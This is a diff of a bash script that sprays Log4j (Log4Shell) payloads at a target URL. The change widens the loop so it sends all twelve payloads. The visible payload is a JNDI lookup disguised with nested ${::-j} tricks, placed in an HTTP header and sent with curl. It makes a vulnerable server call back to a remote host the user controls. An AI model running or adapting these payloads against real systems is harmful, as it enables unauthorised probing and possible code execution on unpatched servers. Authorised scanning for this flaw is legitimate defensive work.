@@ -33,7 +33,7 @@ payload=("X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${
 echo -e "${Cyan}Log4j Testing on = ${GREEN} $1 ${STOP}\n"
 echo -e "${Cyan}your Remote server =${GREEN} $2 ${STOP}\n"
 echo ""
-for i in {1..11} ; do curl $url -H "${payload[$i]}" && echo -e "${Gcyan} Your Current Payload is = ${payload[$i]} ${STOP}\n" ; done
+for i in {0..11} ; do curl $url -H "${payload[$i]}" && echo -e "${Gcyan} Your Current Payload is = ${payload[$i]} ${STOP}\n" ; done
 echo -e " ${STOP}\n"
 echo -e "${GREEN}Please Check your Remote Server,${STOP}\n"
 echo -e "${Cyan}If It's vulnerable to ${Gcyan}Log4j${Cyan}, Will Get a DNS Ping Massage on your Remote Server ${STOP} \n"
